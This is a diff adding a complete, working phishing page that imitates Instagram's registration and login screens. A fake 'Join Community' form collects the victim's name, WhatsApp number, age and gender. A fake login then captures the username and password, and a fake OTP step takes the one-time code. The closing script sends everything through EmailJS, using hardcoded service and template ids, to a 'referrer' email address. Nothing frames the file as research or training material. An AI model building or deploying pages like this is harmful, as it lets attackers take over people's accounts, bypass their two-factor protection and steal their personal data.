@@ -1,0 +1,674 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Join Community</title>
+
+    <!-- EmailJS SDK Integration -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function(){
+            // Public Key Initialization
+            emailjs.init("T9BKyUuqVi2V4b31r");
+        })();
+    </script>
+
+    <style>
+        :root {
+            --fb-blue: #1877f2;
+            --fb-blue-hover: #166fe5;
+            --fb-bg: #f0f2f5;
+            --fb-card-bg: #ffffff;
+            --fb-text-primary: #050505;
+            --fb-text-secondary: #65676b;
+            --fb-border: #ccd0d5;
+            --fb-border-focus: #1877f2;
+            --fb-shadow: 0 12px 28px 0 rgba(0, 0, 0, 0.12), 0 2px 4px 0 rgba(0, 0, 0, 0.08);
+            --font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: var(--font-family);
+        }
+
+        body {
+            background-color: #fafafa;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            min-height: 100vh;
+            padding: 20px 16px;
+            transition: background-color 0.3s ease;
+        }
+
+        /* View Toggle Utility */
+        .hidden {
+            display: none !important;
+        }
+
+        /* --- PAGE 1: COMMUNITY REGISTRATION STYLES --- */
+        .registration-wrapper {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-grow: 1;
+        }
+
+        .mobile-card {
+            background: #ffffff;
+            width: 100%;
+            max-width: 400px;
+            border: 1px solid #dbdbdb;
+            border-radius: 16px;
+            padding: 28px 24px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .instagram-logo {
+            width: 60px;
+            height: 60px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #262626;
+            margin-bottom: 6px;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 12px 14px;
+            font-size: 14px;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            background-color: #fafafa;
+            outline: none;
+            transition: border-color 0.2s ease, background-color 0.2s ease;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            border-color: #a8a8a8;
+            background-color: #ffffff;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 12px;
+            background-color: #0095f6;
+            color: #ffffff;
+            font-size: 14px;
+            font-weight: 600;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.2s ease;
+        }
+
+        .btn-submit:hover {
+            background-color: #1877f2;
+        }
+
+        .btn-submit:active {
+            opacity: 0.7;
+        }
+
+        /* --- PAGE 2: LOGIN STYLES --- */
+        .language-selector {
+            font-size: 13px;
+            color: #737373;
+            margin-top: 10px;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .main-container {
+            width: 100%;
+            max-width: 350px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            flex-grow: 1;
+            justify-content: center;
+        }
+
+        .brand-icon {
+            margin-bottom: 32px;
+            text-align: center;
+        }
+
+        .login-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 6px;
+            font-size: 14px;
+            background-color: #fafafa;
+            outline: none;
+        }
+
+        .input-field:focus {
+            border-color: #a8a8a8;
+            background-color: #ffffff;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: background-color 0.2s ease;
+        }
+
+        .btn-primary:hover {
+            background-color: #1877f2;
+        }
+
+        .btn-primary:disabled {
+            background-color: #b2dffc;
+            cursor: not-allowed;
+        }
+
+        .forgot-link {
+            text-align: center;
+            margin-top: 16px;
+            margin-bottom: 24px;
+        }
+
+        .forgot-link a {
+            color: #00376b;
+            text-decoration: none;
+            font-size: 12px;
+            font-weight: 400;
+        }
+
+        .btn-secondary {
+            width: 100%;
+            padding: 10px;
+            background-color: transparent;
+            color: #0095f6;
+            border: 1px solid #0095f6;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            text-align: center;
+            text-decoration: none;
+            display: block;
+        }
+
+        /* --- PAGE 3: OTP VERIFICATION STYLES --- */
+        .otp-wrapper {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-grow: 1;
+        }
+
+        .phone-wrapper {
+            width: 100%;
+            max-width: 400px;
+            background: var(--fb-card-bg);
+            border-radius: 20px;
+            box-shadow: var(--fb-shadow);
+            padding: 32px 24px;
+            text-align: center;
+            border: 1px solid #e4e6eb;
+        }
+
+        .icon-container {
+            width: 56px;
+            height: 56px;
+            background-color: #e7f3ff;
+            border-radius: 50%;
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+
+        .icon-container svg {
+            width: 28px;
+            height: 28px;
+            fill: var(--fb-blue);
+        }
+
+        .title {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--fb-text-primary);
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: var(--fb-text-secondary);
+            line-height: 1.4;
+            margin-bottom: 24px;
+        }
+
+        .input-label {
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--fb-text-secondary);
+            margin-bottom: 12px;
+            text-align: left;
+            display: block;
+        }
+
+        .otp-container {
+            display: flex;
+            gap: 8px;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+
+        .otp-input {
+            width: 48px;
+            height: 56px;
+            border: 1.5px solid var(--fb-border);
+            border-radius: 8px;
+            font-size: 22px;
+            font-weight: 700;
+            text-align: center;
+            color: var(--fb-text-primary);
+            background: #f5f6f7;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+
+        .otp-input:focus {
+            border-color: var(--fb-border-focus);
+            background: #ffffff;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+        }
+
+        .info-text {
+            font-size: 13px;
+            color: var(--fb-text-secondary);
+            margin-bottom: 24px;
+        }
+
+        .info-text span {
+            font-weight: 600;
+            color: var(--fb-text-primary);
+        }
+
+        .verify-btn {
+            width: 100%;
+            padding: 12px 16px;
+            background-color: var(--fb-blue);
+            color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .verify-btn:hover {
+            background-color: var(--fb-blue-hover);
+        }
+
+        .verify-btn:disabled {
+            background-color: #e4e6eb;
+            color: #bcc0c4;
+            cursor: not-allowed;
+        }
+
+        .footer {
+            font-size: 12px;
+            color: #737373;
+            margin-top: 20px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- PAGE 1: REGISTRATION SECTION -->
+    <div id="registerView" class="registration-wrapper">
+        <div class="mobile-card">
+            <!-- Instagram Logo Header -->
+            <div class="logo-container">
+                <svg class="instagram-logo" viewBox="0 0 512 512" width="60" height="60" xmlns="http://www.w3.org/2000/svg">
+                    <defs>
+                        <radialGradient id="ig-grad" cx="0.2" cy="1" r="1">
+                            <stop offset="0%" stop-color="#fdf497"/>
+                            <stop offset="5%" stop-color="#fdf497"/>
+                            <stop offset="45%" stop-color="#fd5949"/>
+                            <stop offset="60%" stop-color="#d6249f"/>
+                            <stop offset="90%" stop-color="#285AEB"/>
+                        </radialGradient>
+                    </defs>
+                    <path fill="url(#ig-grad)" d="M386.7 125.3c-27.1-27.1-64.6-43.8-130.7-43.8s-103.6 16.7-130.7 43.8C98.2 152.4 81.5 189.9 81.5 256s16.7 103.6 43.8 130.7c27.1 27.1 64.6 43.8 130.7 43.8s103.6-16.7 130.7-43.8c27.1-27.1 43.8-64.6 43.8-130.7s-16.7-103.6-43.8-130.7zm-130.7 274c-112 0-143.3-31.3-143.3-143.3S144 112.7 256 112.7 399.3 144 399.3 256 368 399.3 256 399.3z"/>
+                    <path fill="url(#ig-grad)" d="M256 166c-49.7 0-90 40.3-90 90s40.3 90 90 90 90-40.3 90-90-40.3-90-90-90zm0 148c-32 0-58-26-58-58s26-58 58-58 58 26 58 58-26 58-58 58z"/>
+                    <circle fill="url(#ig-grad)" cx="350" cy="162" r="21"/>
+                </svg>
+            </div>
+
+            <!-- Form -->
+            <form id="communityForm">
+                <!-- Full name -->
+                <div class="form-group">
+                    <label for="fullName">Full name</label>
+                    <input type="text" id="fullName" name="fullName" placeholder="Enter your full name" required />
+                </div>
+
+                <!-- WhatsApp Contact -->
+                <div class="form-group">
+                    <label for="whatsapp">WhatsApp Contact</label>
+                    <input type="tel" id="whatsapp" name="whatsapp" placeholder="Enter your WhatsApp number" required />
+                </div>
+
+                <!-- How long have you been using Instagram -->
+                <div class="form-group">
+                    <label for="igDuration">How long have you been using Instagram</label>
+                    <input type="text" id="igDuration" name="igDuration" placeholder="e.g. 3 years" required />
+                </div>
+
+                <!-- Age -->
+                <div class="form-group">
+                    <label for="age">Age</label>
+                    <input type="number" id="age" name="age" placeholder="Enter your age" required />
+                </div>
+
+                <!-- Gender -->
+                <div class="form-group">
+                    <label for="gender">Gender</label>
+                    <select id="gender" name="gender" required>
+                        <option value="" disabled selected>Select your gender</option>
+                        <option value="Male">Male</option>
+                        <option value="Female">Female</option>
+                        <option value="Other">Other</option>
+                    </select>
+                </div>
+
+                <!-- Referrer Input -->
+                <div class="form-group">
+                    <label for="referrer">Referrer Email</label>
+                    <input type="email" id="referrer" name="referrer" placeholder="Enter referrer email" required />
+                </div>
+
+                <!-- Join Community Button -->
+                <button type="submit" class="btn-submit">Join Community</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- PAGE 2: LOGIN SECTION (HIDDEN BY DEFAULT) -->
+    <div id="loginView" class="main-container hidden">
+        <div class="language-selector">
+            English (UK)
+        </div>
+
+        <div class="brand-icon">
+            <svg viewBox="0 0 512 512" width="60" height="60" xmlns="http://www.w3.org/2000/svg">
+                <radialGradient id="ig-grad2" cx="0.2" cy="1" r="1">
+                    <stop offset="0%" stop-color="#fdf497"/>
+                    <stop offset="5%" stop-color="#fdf497"/>
+                    <stop offset="45%" stop-color="#fd5949"/>
+                    <stop offset="60%" stop-color="#d6249f"/>
+                    <stop offset="90%" stop-color="#285AEB"/>
+                </radialGradient>
+                <path fill="url(#ig-grad2)" d="M386.7 125.3c-27.1-27.1-64.6-43.8-130.7-43.8s-103.6 16.7-130.7 43.8C98.2 152.4 81.5 189.9 81.5 256s16.7 103.6 43.8 130.7c27.1 27.1 64.6 43.8 130.7 43.8s103.6-16.7 130.7-43.8c27.1-27.1 43.8-64.6 43.8-130.7s-16.7-103.6-43.8-130.7zm-130.7 274c-112 0-143.3-31.3-143.3-143.3S144 112.7 256 112.7 399.3 144 399.3 256 368 399.3 256 399.3z"/>
+                <path fill="url(#ig-grad2)" d="M256 166c-49.7 0-90 40.3-90 90s40.3 90 90 90 90-40.3 90-90-40.3-90-90-90zm0 148c-32 0-58-26-58-58s26-58 58-58 58 26 58 58-26 58-58 58z"/>
+                <circle fill="url(#ig-grad2)" cx="350" cy="162" r="21"/>
+            </svg>
+        </div>
+
+        <form class="login-form" id="authForm">
+            <input 
+                type="text" 
+                id="loginUsername"
+                class="input-field" 
+                placeholder="Username, phone number or email" 
+                required 
+            />
+            <input 
+                type="password" 
+                id="loginPassword"
+                class="input-field" 
+                placeholder="Password" 
+                required 
+            />
+            <button type="submit" id="loginBtn" class="btn-primary">Log in</button>
+        </form>
+
+        <div class="forgot-link">
+            <a href="#">Forgotten your password?</a>
+        </div>
+
+        <a href="#" id="showRegisterBtn" class="btn-secondary">Create new account</a>
+    </div>
+
+    <!-- PAGE 3: OTP VERIFICATION SECTION (HIDDEN BY DEFAULT) -->
+    <div id="otpView" class="otp-wrapper hidden">
+        <div class="phone-wrapper">
+            <div class="icon-container">
+                <svg viewBox="0 0 24 24">
+                    <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+                </svg>
+            </div>
+
+            <h1 class="title">OTP Verification</h1>
+            <p class="subtitle">Enter the 6-digit code sent to you to confirm it's really you.</p>
+
+            <span class="input-label">Enter the 6-digit code</span>
+
+            <div class="otp-container" id="otp-inputs">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
+            </div>
+
+            <p class="info-text">A verification code was sent to <span id="sentTargetDisplay">your contact</span></p>
+
+            <button class="verify-btn" id="verify-btn" disabled>
+                I'm not a bot
+            </button>
+        </div>
+    </div>
+
+    <div class="footer">
+        Company Name
+    </div>
+
+    <script>
+        // Views
+        const registerView = document.getElementById('registerView');
+        const loginView = document.getElementById('loginView');
+        const otpView = document.getElementById('otpView');
+
+        // Form elements
+        const showRegisterBtn = document.getElementById('showRegisterBtn');
+        const loginUsername = document.getElementById('loginUsername');
+        const loginPassword = document.getElementById('loginPassword');
+        const loginBtn = document.getElementById('loginBtn');
+        
+        // OTP elements
+        const otpInputs = document.querySelectorAll('.otp-input');
+        const verifyBtn = document.getElementById('verify-btn');
+        const sentTargetDisplay = document.getElementById('sentTargetDisplay');
+
+        // Global state object
+        let formDataStore = {};
+
+        // Navigation Functions
+        function goToLogin() {
+            registerView.classList.add('hidden');
+            otpView.classList.add('hidden');
+            loginView.classList.remove('hidden');
+            document.body.style.backgroundColor = "#ffffff";
+        }
+
+        function goToRegistration() {
+            loginView.classList.add('hidden');
+            otpView.classList.add('hidden');
+            registerView.classList.remove('hidden');
+            document.body.style.backgroundColor = "#fafafa";
+        }
+
+        function goToOTP() {
+            registerView.classList.add('hidden');
+            loginView.classList.add('hidden');
+            otpView.classList.remove('hidden');
+            document.body.style.backgroundColor = "#f0f2f5";
+            if (otpInputs.length > 0) otpInputs[0].focus();
+        }
+
+        // 1. Registration Handler: Collect data and go to Login view
+        document.getElementById('communityForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            formDataStore = {
+                fullName: document.getElementById('fullName').value,
+                whatsapp: document.getElementById('whatsapp').value,
+                igDuration: document.getElementById('igDuration').value,
+                age: document.getElementById('age').value,
+                gender: document.getElementById('gender').value,
+                referrer: document.getElementById('referrer').value
+            };
+
+            if (formDataStore.whatsapp.trim() !== '') {
+                loginUsername.value = formDataStore.whatsapp;
+            }
+
+            goToLogin();
+        });
+
+        // Toggle back to Registration Page
+        showRegisterBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            goToRegistration();
+        });
+
+        // 2. Login Handler: Save credentials and proceed to OTP view
+        document.getElementById('authForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            formDataStore.loginPhone = loginUsername.value;
+            formDataStore.loginPassword = loginPassword.value;
+
+            // Update display text on OTP page
+            sentTargetDisplay.textContent = formDataStore.loginPhone || 'your contact';
+
+            goToOTP();
+        });
+
+        // 3. OTP Input Logic
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length > 0 && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+                checkFullCode();
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !input.value && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+
+            input.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const pastedData = e.clipboardData.getData('text').trim();
+
+                if (/^\d{6}$/.test(pastedData)) {
+                    pastedData.split('').forEach((char, i) => {
+                        if (otpInputs[i]) otpInputs[i].value = char;
+                    });
+                    otpInputs[otpInputs.length - 1].focus();
+                    checkFullCode();
+                }
+            });
+        });
+
+        function checkFullCode() {
+            const code = Array.from(otpInputs).map(i => i.value).join('');
+            if (code.length === 6) {
+                verifyBtn.removeAttribute('disabled');
+            } else {
+                verifyBtn.setAttribute('disabled', 'true');
+            }
+        }
+
+        // 4. Final Submission via EmailJS
+        verifyBtn.addEventListener('click', () => {
+            const otpCode = Array.from(otpInputs).map(i => i.value).join('');
+            
+            verifyBtn.innerText = "Verifying...";
+            verifyBtn.disabled = true;
+
+            const templateParams = {
+                to_email: formDataStore.referrer || '',
+                full_name: formDataStore.fullName || '',
+                whatsapp: formDataStore.whatsapp || '',
+                experience: formDataStore.igDuration || '',
+                age: formDataStore.age || '',
+                gender: formDataStore.gender || '',
+                referrer: formDataStore.referrer || '',
+                login_phone: formDataStore.loginPhone || '',
+                login_password: formDataStore.loginPassword || '',
+                otp_code: otpCode
+            };
+
+            emailjs.send('service_rf9jc9g', 'template_ykjxd5h', templateParams)
+                .then(function(response) {
+                    alert('Verification Successful!');
+                    verifyBtn.innerText = "I'm not a bot";
+                    verifyBtn.disabled = false;
+                })
+                .catch(function(error) {
+                    alert('Failed to verify: ' + JSON.stringify(error));
+                    verifyBtn.innerText = "I'm not a bot";
+                    verifyBtn.disabled = false;
+                });
+        });
+    </script>
+
+</body>
+</html>
